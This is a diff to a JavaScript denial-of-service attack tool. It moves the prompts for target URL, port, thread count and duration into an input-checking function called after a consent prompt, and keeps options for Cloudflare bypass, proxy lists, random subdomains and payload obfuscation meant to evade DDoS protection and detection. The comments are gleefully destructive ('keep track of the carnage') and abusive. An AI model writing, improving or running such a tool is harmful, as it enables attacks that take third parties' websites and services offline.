@@ -21,28 +21,20 @@ const fs = require('fs'); // File system module for logging
 const { fetch } = require('cross-fetch'); // Cross-browser fetch
 
 // Configuration - Let's fuck things up HARD!
-let targetURL = prompt(`${purple}Enter target URL (including http/https/onion):${resetColor}`);
+let targetURL;
 let targetHost;
-try {
-    targetURL = new URL(targetURL);
-    targetHost = targetURL.hostname;
-} catch (error) {
-    alert(`${darkRed}Invalid URL! You fucked it up!${resetColor}`);
-    window.close();
-}
-
-const port = parseInt(prompt(`${purple}Enter target port (e.g., 80, 443, 8080):${resetColor}`));
-const threads = parseInt(prompt(`${purple}Enter number of threads (crank it up to 666!):${resetColor}`));
-const duration = parseInt(prompt(`${purple}Enter duration in seconds (let's go long term - FOREVER!):${resetColor}`));
-const logFile = "ddos_fuck_log.txt"; // Log file name - keep track of the carnage
+let port;
+let threads;
+let duration;
+let logFile = "ddos_fuck_log.txt"; // Log file name - keep track of the carnage
 let isRunning = false; // Track attack status
-let onionSupport = confirm(`${darkPurple}Enable .onion support? Requires Tor proxy. Don't be a retard if you don't know what this is:${resetColor}`);
-let cloudflareBypass = confirm(`${darkPurple}Attempt Cloudflare bypass? (May not always work, you dumbass!) Using advanced techniques. Better have good proxies!${resetColor}`);
-let proxyListURL = prompt(`${purple}Enter URL for proxy list (HTTP/SOCKS4/SOCKS5 - one proxy per line). Leave blank to skip (not recommended for Cloudflare bypass):${resetColor}`);
-let useRandomSubdomains = confirm(`${darkPurple}Use random subdomains? (Helps bypass some DDoS protection. Smart, huh?)${resetColor}`);
-let advancedObfuscation = confirm(`${darkPurple}Enable advanced payload obfuscation? (Might evade some detection systems, but can slow things down. Your call.)${resetColor}`);
-let autoAdjustThreads = confirm(`${darkPurple}Automatically adjust threads based on connection health? (experimental, might make things worse. What the hell, let's try.)${resetColor}`);
-let customPayload = prompt(`${purple}Enter custom payload (or leave blank for default GET request):${resetColor}`);
+let onionSupport;
+let cloudflareBypass;
+let proxyListURL;
+let useRandomSubdomains;
+let advancedObfuscation;
+let autoAdjustThreads;
+let customPayload;
 
 // Colors (ANSI escape codes) - Make it look badass!
 const darkGreen = "\x1b[32m";
@@ -537,12 +529,101 @@ function showConsent() {
     });
 }
 
+function askForDetails() {
+    return new Promise((resolve) => {
+        targetURL = prompt(`${purple}Enter target URL (including http/https/onion):${resetColor}`);
+        if (!targetURL) {
+            alert(`${darkRed}Target URL is required!${resetColor}`);
+            window.close();
+            resolve(null);
+            return;
+        }
+
+        try {
+            targetURL = new URL(targetURL);
+            targetHost = targetURL.hostname;
+        } catch (error) {
+            alert(`${darkRed}Invalid URL! You fucked it up!${resetColor}`);
+            window.close();
+            resolve(null);
+            return;
+        }
+
+        port = parseInt(prompt(`${purple}Enter target port (e.g., 80, 443, 8080):${resetColor}`));
+        if (isNaN(port)) {
+            alert(`${darkRed}Invalid port! Use a number, you dumbass!${resetColor}`);
+            window.close();
+            resolve(null);
+            return;
+        }
+
+        threads = parseInt(prompt(`${purple}Enter number of threads (crank it up to 666!):${resetColor}`));
+        if (isNaN(threads)) {
+            alert(`${darkRed}Invalid thread count! Use a number, idiot!${resetColor}`);
+            window.close();
+            resolve(null);
+            return;
+        }
+
+        duration = parseInt(prompt(`${purple}Enter duration in seconds (let's go long term - FOREVER!):${resetColor}`));
+        if (isNaN(duration)) {
+            alert(`${darkRed}Invalid duration! Use a number, moron!${resetColor}`);
+            window.close();
+            resolve(null);
+            return;
+        }
+
+        onionSupport = confirm(`${darkPurple}Enable .onion support? Requires Tor proxy. Don't be a retard if you don't know what this is:${resetColor}`);
+        cloudflareBypass = confirm(`${darkPurple}Attempt Cloudflare bypass? (May not always work, you dumbass!) Using advanced techniques. Better have good proxies!${resetColor}`);
+        proxyListURL = prompt(`${purple}Enter URL for proxy list (HTTP/SOCKS4/SOCKS5 - one proxy per line). Leave blank to skip (not recommended for Cloudflare bypass):${resetColor}`);
+        useRandomSubdomains = confirm(`${darkPurple}Use random subdomains? (Helps bypass some DDoS protection. Smart, huh?)${resetColor}`);
+        advancedObfuscation = confirm(`${darkPurple}Enable advanced payload obfuscation? (Might evade some detection systems, but can slow things down. Your call.)${resetColor}`);
+        autoAdjustThreads = confirm(`${darkPurple}Automatically adjust threads based on connection health? (experimental, might make things worse. What the hell, let's try.)${resetColor}`);
+        customPayload = prompt(`${purple}Enter custom payload (or leave blank for default GET request):${resetColor}`);
+
+        resolve({
+            targetURL,
+            targetHost,
+            port,
+            threads,
+            duration,
+            onionSupport,
+            cloudflareBypass,
+            proxyListURL,
+            useRandomSubdomains,
+            advancedObfuscation,
+            autoAdjustThreads,
+            customPayload
+        });
+    });
+}
+
 // Main execution - let's get this party started!
 async function main() {
     const consentGiven = await showConsent();
     if (!consentGiven) {
         return;
     }
+
+    const details = await askForDetails();
+    if (!details) {
+        return;
+    }
+
+    ({
+        targetURL,
+        targetHost,
+        port,
+        threads,
+        duration,
+        onionSupport,
+        cloudflareBypass,
+        proxyListURL,
+        useRandomSubdomains,
+        advancedObfuscation,
+        autoAdjustThreads,
+        customPayload
+    } = details);
 
     const resolvedIPs = await resolveHostname(targetHost);
     if (!resolvedIPs) {
